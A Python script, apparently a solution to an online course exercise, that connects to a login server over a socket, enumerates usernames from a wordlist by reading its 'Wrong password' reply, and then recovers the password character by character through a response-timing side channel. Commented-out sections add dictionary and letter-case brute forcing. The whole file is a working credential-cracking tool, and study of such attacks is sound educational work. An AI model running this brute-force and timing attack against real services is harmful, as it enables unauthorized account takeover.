import argparse
# from datetime import datetime, timedelta
# from itertools import chain
# from itertools import product
# from os import path
import json
import socket
from string import ascii_lowercase, ascii_uppercase, digits
from time import perf_counter


BUFFER_SIZE = 4096

LOGIN_RESPONSES = {"wrong login": "Wrong login!", "wrong password": "Wrong password!",
                   "exception": "Exception happened during login", "success": "Connection success!",
                   "bad request": "Bad request!"}

PASSWORD_CHARS = ascii_lowercase+ascii_uppercase+digits


# def pass_gen(length):
#     for p in chain.from_iterable(product(ascii_lowercase + digits, repeat=r) for r in range(1, length + 1)):
#         yield "".join(p)


def login_gen():
    with open(r".\hacking\logins.txt", "r") as f:
        for line in f:
            yield line.strip("\r\n")


# def pass_gen():
#     # file_pwd = path.join(path.dirname(__file__), "passwords.txt")
#     # with open(file_pwd, 'r', encoding='utf-8') as f:
#     with open(r".\hacking\passwords.txt", "r") as f:
#         for line in f:
#             line = line.strip("\r\n")
#             for letter_cases in product((0, 1), repeat=len(line)):
#                 yield "".join(ch.upper() if case else ch for case, ch in zip(letter_cases, line))
#             # for variation in map(''.join, product(*((c.upper(), c.lower()) for c in line))):
#             #     yield variation
#             # for p in map(''.join, product(*zip(line.lower(), line.upper()))):
#             #     yield p


def serialize_login(login, password):
    return json.dumps({"login": login, "password": password}).encode()


def deserialize_login_response(response):
    return json.loads(response.decode())["result"]


def attempt_login(sock, login, password):
    """attempts to login into server
    :returns server response, time elapsed in ms"""
    login_msg = serialize_login(login, password)
    sock.send(login_msg)
    # start = datetime.now()
    start = perf_counter()
    login_response = sock.recv(BUFFER_SIZE)
    # finish = datetime.now()
    finish = perf_counter()
    delta = finish - start
    # return deserialize_login_response(login_response), delta.total_seconds()*1000
    return deserialize_login_response(login_response), delta * 1000



def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("hostname")
    parser.add_argument("port", type=int)

    args = parser.parse_args()

    with socket.socket() as sock:
        sock.connect((args.hostname, args.port))
        for login in login_gen():
            sock.send(serialize_login(login, " "))
            if deserialize_login_response(sock.recv(BUFFER_SIZE)) == LOGIN_RESPONSES["wrong password"]:
                break

        current_response = ""
        password = ""
        # at each iteration make a dict of response time for each char and choose the longest one.
        while current_response != LOGIN_RESPONSES["success"]:
            cur_response_times = {}
            for ch in PASSWORD_CHARS:
                current_response, current_response_time_ms = attempt_login(sock, login, password+ch)
                if current_response == LOGIN_RESPONSES["bad request"]:
                    break
                if current_response == LOGIN_RESPONSES["success"]:
                    cur_response_times = {ch: current_response_time_ms}     # ch is definitely the right one
                    break
                elif current_response == LOGIN_RESPONSES["wrong password"]:
                    cur_response_times[ch] = current_response_time_ms
            password += max(cur_response_times, key=cur_response_times.get)

        print(json.dumps({"login": login, "password": password}, indent=4))


        # # at each iteration choose the char with response time > 0.5 of response time for ""
        # # short_response_time_ms = attempt_login(sock, login, " ")[1]
        # long_response_time_ms = attempt_login(sock, login, "")[1]  # "" as password triggers the exception
        # while current_response != LOGIN_RESPONSES["success"]:
        #     for ch in PASSWORD_CHARS:
        #         current_response, current_response_time_ms = attempt_login(sock, login, password+ch)
        #         # if current_response == LOGIN_RESPONSES["exception"]:
        #         #     password += ch
        #         #     break
        #         if current_response == LOGIN_RESPONSES["bad request"]:
        #             break
        #         if current_response == LOGIN_RESPONSES["success"]:
        #             password += ch
        #             break
        #         elif current_response == LOGIN_RESPONSES["wrong password"] and current_response_time_ms > 0.5 * long_response_time_ms:  # > 100:  # 6 * short_response_time_ms:
        #             password += ch
        #             break


if __name__ == '__main__':
    main()



# import requests
#
#
# def get_passwords():
#     pw_str = requests.get('https://stepik.org/media/attachments/lesson/255258/passwords.txt').text
#     return pw_str.split("\r\n")
# login_str = requests.get('https://stepik.org/media/attachments/lesson/255258/logins.txt').text
